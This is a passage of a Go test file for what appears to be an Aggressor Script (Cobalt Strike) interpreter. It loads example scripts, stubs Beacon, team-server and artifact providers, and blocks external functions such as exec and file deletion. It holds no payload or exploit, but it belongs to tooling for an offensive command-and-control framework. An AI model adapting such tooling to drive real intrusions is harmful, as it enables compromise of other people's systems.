	var action AggressorDialogButtonID
	for _, button := range dialog.presentation.Buttons {
		if button.Kind == AggressorDialogButtonAction && button.Label == "Launch" {
			action = button.ID
			break
		}
	}
	if action == 0 {
		t.Fatal("Launch action button is missing")
	}
	responses := make([]AggressorDialogRowValue, 0, len(dialog.presentation.Rows))
	for _, row := range dialog.presentation.Rows {
		value, exists := options.Get(row.Name)
		if !exists {
			t.Fatalf("dialog option %q is missing", row.Name)
		}
		responses = append(responses, AggressorDialogRowValue{RowID: row.ID, Value: value})
	}
	if _, err := dialog.responder.Activate(context.Background(), action, responses...); err != nil {
		t.Fatalf("dialog callback: %v", err)
	}
}

func isOfficialBehaviorUIFunction(name string) bool {
	if _, exists := aggressorDialogRowSpecs[name]; exists {
		return true
	}
	if _, exists := aggressorPromptSpecs[name]; exists {
		return true
	}
	switch name {
	case "dialog", "dialog_description", "dialog_show", "dbutton_action", "dbutton_help":
		return true
	default:
		return false
	}
}

type officialBehaviorObjectHost struct {
	mu    sync.Mutex
	calls []ObjectInvocation
}

func (host *officialBehaviorObjectHost) Object(_ context.Context, invocation ObjectInvocation) (Value, error) {
	copyInvocation := invocation
	values := invocation.Values()
	copyInvocation.Arguments = make([]Argument, len(values))
	for index, value := range values {
		copyInvocation.Arguments[index] = Argument{Value: value}
	}
	host.mu.Lock()
	host.calls = append(host.calls, copyInvocation)
	host.mu.Unlock()
	if invocation.Op == ObjectConstruct {
		return ObjectValue(&officialBehaviorObject{class: invocation.Class}), nil
	}
	if invocation.Op == ObjectInvoke && invocation.Class == "common.ArtifactUtils" && invocation.Message == "buildPython" {
		return String("PYTHON-STUB"), nil
	}
	return Null(), nil
}

func (host *officialBehaviorObjectHost) takeCalls() []ObjectInvocation {
	host.mu.Lock()
	defer host.mu.Unlock()
	calls := append([]ObjectInvocation(nil), host.calls...)
	host.calls = nil
	return calls
}

type officialBehaviorObject struct {
	class string
}

func loadOfficialBehaviorExample(t *testing.T, name string) (*Runtime, *Script, *officialBehaviorHost, *bytes.Buffer) {
	t.Helper()
	data, err := os.ReadFile(filepath.Join("testdata", "upstream", "aggressor-script-examples", name))
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	program, err := Compile(NewSource(name, data))
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}
	objects := &officialBehaviorObjectHost{}
	host := &officialBehaviorHost{
		objects: objects,
		dialog:  ObjectValue(&officialBehaviorObject{class: "dialog"}),
	}
	var output bytes.Buffer
	var diagnostics bytes.Buffer
	options := []Option{
		WithHost(host),
		WithAggressorArtifactProvider(host),
		WithAggressorBeaconActionProvider(host),
		WithAggressorBeaconTranscriptSink(host),
		WithAggressorClientUIProvider(host),
		WithAggressorDialogProvider(host),
		WithAggressorPromptProvider(host),
		WithAggressorSiteProvider(host),
		WithAggressorTeamServerRPCProvider(host),
		WithObjectHost(objects),
		WithStdout(&output),
		WithStderr(&diagnostics),
		WithClock(ClockFunc(func() time.Time { return officialBehaviorInstant })),
		WithInstructionLimit(250_000),
	}
	for _, external := range []string{
		"__EXEC__", "exec", "openf", "ls", "lof", "mkdir",
		"deleteFile", "move", "rename", "copyFile",
	} {
		external := external
		options = append(options, WithFunction(external, func(context.Context, Invocation) (Value, error) {
			return Null(), fmt.Errorf("test blocked external function %s", external)
		}))
	}
	runtime, err := New(options...)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	script, err := runtime.Load(context.Background(), program)
	if err != nil {
		t.Fatalf("Load: %v; diagnostics: %s", err, diagnostics.String())
	}
	t.Cleanup(func() {
		if err := script.Unload(context.Background()); err != nil {
			t.Errorf("Unload(%s): %v", name, err)
		}
		if got := diagnostics.String(); got != "" {
			t.Errorf("%s diagnostics = %q, want empty", name, got)
		}
	})
	return runtime, script, host, &output
}

type officialCallbackArgument struct{}

type officialNullArgument struct{}

type officialHashArgument map[string]any

type officialExpectedCall struct {
	name      string
	arguments []any
}

func expectedOfficialCall(name string, arguments ...any) officialExpectedCall {
	return officialExpectedCall{name: name, arguments: arguments}
}

func assertOfficialBehaviorCalls(t *testing.T, got []officialBehaviorCall, want ...officialExpectedCall) {
	t.Helper()
	if len(got) != len(want) {
		t.Fatalf("host call count = %d, want %d; names = %v", len(got), len(want), officialBehaviorCallNames(got))
	}
	for index, expected := range want {
		actual := got[index]
		if actual.name != expected.name {
			t.Fatalf("host call %d name = %q, want %q; names = %v", index, actual.name, expected.name, officialBehaviorCallNames(got))
		}
		if len(actual.values) != len(expected.arguments) {
			t.Fatalf("%s argument count = %d, want %d; values = %s", actual.name, len(actual.values), len(expected.arguments), ArrayValue(NewArray(actual.values...)).Describe())
		}
		for argumentIndex, expectedArgument := range expected.arguments {
			actualArgument := actual.values[argumentIndex]
			switch value := expectedArgument.(type) {
			case string:
				if actualArgument.Kind() != KindString || actualArgument.String() != value {
					t.Fatalf("%s argument %d = %s, want string %q", actual.name, argumentIndex, actualArgument.Describe(), value)
				}
			case officialCallbackArgument:
				if actualArgument.Kind() != KindFunction {
					t.Fatalf("%s argument %d = %s, want function", actual.name, argumentIndex, actualArgument.Describe())
				}
			case officialNullArgument:
				if !actualArgument.IsNull() {
					t.Fatalf("%s argument %d = %s, want null", actual.name, argumentIndex, actualArgument.Describe())
				}
			case int32:
				if actualArgument.Kind() != KindInt || actualArgument.Int32() != value {
					t.Fatalf("%s argument %d = %s, want int %d", actual.name, argumentIndex, actualArgument.Describe(), value)
				}
			case Value:
				if !actualArgument.IdentityEqual(value) {
					t.Fatalf("%s argument %d = %s, want identical %s", actual.name, argumentIndex, actualArgument.Describe(), value.Describe())
				}
			case officialHashArgument:
				hash, ok := actualArgument.Hash()
				if !ok || hash.Len() != len(value) {
					t.Fatalf("%s argument %d = %s, want hash %#v", actual.name, argumentIndex, actualArgument.Describe(), value)
				}
				for key, hashExpected := range value {
					hashValue, present := hash.Get(key)
					if !present {
						t.Fatalf("%s argument %d hash is missing %q", actual.name, argumentIndex, key)
					}
					switch hashExpected := hashExpected.(type) {
					case string:
						if hashValue.Kind() != KindString || hashValue.String() != hashExpected {
							t.Fatalf("%s argument %d hash[%q] = %s, want %q", actual.name, argumentIndex, key, hashValue.Describe(), hashExpected)
						}
					case int32:
						if hashValue.Kind() != KindInt || hashValue.Int32() != hashExpected {
							t.Fatalf("%s argument %d hash[%q] = %s, want %d", actual.name, argumentIndex, key, hashValue.Describe(), hashExpected)
						}
					default:
						t.Fatalf("test has unsupported expected hash argument %T", hashExpected)
					}
				}
			default:
				t.Fatalf("test has unsupported expected argument %T", expectedArgument)
			}
		}
	}
}

func officialBehaviorCallNames(calls []officialBehaviorCall) []string {
	names := make([]string, len(calls))
	for index, call := range calls {
		names[index] = call.name
	}
	return names
}
